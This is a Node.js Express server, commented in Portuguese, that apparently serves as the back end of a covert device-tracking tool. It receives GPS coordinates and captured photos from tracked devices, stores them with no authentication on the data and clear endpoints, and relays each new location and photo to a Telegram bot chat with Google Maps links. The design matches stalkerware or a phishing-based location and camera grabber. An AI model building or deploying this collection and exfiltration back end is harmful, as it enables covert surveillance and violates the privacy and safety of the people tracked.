const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Configuração do Telegram (pega das variáveis de ambiente)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Banco de dados simples
const DB_FILE = 'database.json';

function readDB() {
    try {
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch {
        return { locations: [], devices: [] };
    }
}

function saveDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// Função para enviar mensagem para Telegram
async function sendToTelegram(message, photoBase64 = null) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('❌ Telegram não configurado');
        return;
    }

    try {
        if (photoBase64) {
            // Enviar foto
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBase64);
            formData.append('caption', message);
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } else {
            // Enviar apenas mensagem
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        }
        console.log('✅ Mensagem enviada para Telegram');
    } catch (error) {
        console.error('❌ Erro ao enviar para Telegram:', error);
    }
}

// Rota para receber dados
app.post('/track', async (req, res) => {
    const data = req.body;
    const db = readDB();
    
    // Adicionar timestamp
    data.timestamp = new Date().toISOString();
    data.id = Date.now() + Math.random().toString(36).substr(2, 5);
    
    db.locations.push(data);
    
    // Atualizar dispositivo
    const deviceIndex = db.devices.findIndex(d => d.deviceId === data.deviceId);
    if (deviceIndex === -1) {
        db.devices.push({
            deviceId: data.deviceId,
            firstSeen: data.timestamp,
            lastSeen: data.timestamp,
            locations: [data],
            status: 'online'
        });
    } else {
        db.devices[deviceIndex].lastSeen = data.timestamp;
        db.devices[deviceIndex].locations.push(data);
    }
    
    saveDB(db);
    
    // ENVIAR PARA TELEGRAM BASEADO NO TIPO DE DADO
    try {
        switch(data.type) {
            case 'location_update':
                const mapsUrl = `https://maps.google.com/?q=${data.location.lat},${data.location.lng}`;
                const locationMessage = 
                    `📍 <b>NOVA LOCALIZAÇÃO</b>\n` +
                    `📱 <b>Dispositivo:</b> ${data.deviceId}\n` +
                    `🗺️ <b>Coordenadas:</b> ${data.location.lat.toFixed(6)}, ${data.location.lng.toFixed(6)}\n` +
                    `🎯 <b>Precisão:</b> ${data.location.accuracy ? data.location.accuracy.toFixed(2) + 'm' : 'N/A'}\n` +
                    `📏 <b>Altitude:</b> ${data.location.altitude || 'N/A'}\n` +
                    `🎪 <b>Velocidade:</b> ${data.location.speed ? data.location.speed.toFixed(2) + ' m/s' : 'N/A'}\n` +
                    `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}\n` +
                    `🔗 <a href="${mapsUrl}">Ver no Google Maps</a>`;
                
                await sendToTelegram(locationMessage);
                break;
                
            case 'photo_capture':
                const photoMessage = 
                    `📸 <b>NOVA FOTO CAPTURADA</b>\n` +
                    `📱 <b>Dispositivo:</b> ${data.deviceId}\n` +
                    `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}\n` +
                    `📊 <b>Tamanho:</b> ${Math.round(data.photo.length / 1024)}KB`;
                
                await sendToTelegram(photoMessage, data.photo);
                break;
                
            case 'heartbeat':
                // Não enviar heartbeat para não floodar
                console.log('💓 Heartbeat recebido:', data.deviceId);
                break;
                
            default:
                console.log('📨 Dados recebidos:', data.type);
        }
    } catch (error) {
        console.error('❌ Erro ao processar dados:', error);
    }
    
    res.json({ status: 'success', received: true });
});

// Dashboard
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/api/data', (req, res) => {
    res.json(readDB());
});

// Limpar dados (opcional)
app.delete('/api/clear', (req, res) => {
    saveDB({ locations: [], devices: [] });
    res.json({ status: 'cleared' });
});

app.listen(port, () => {
    console.log(`🚀 Sistema rodando na porta: ${port}`);
    console.log(`🤖 Telegram: ${BOT_TOKEN ? 'Configurado' : 'Não configurado'}`);
});
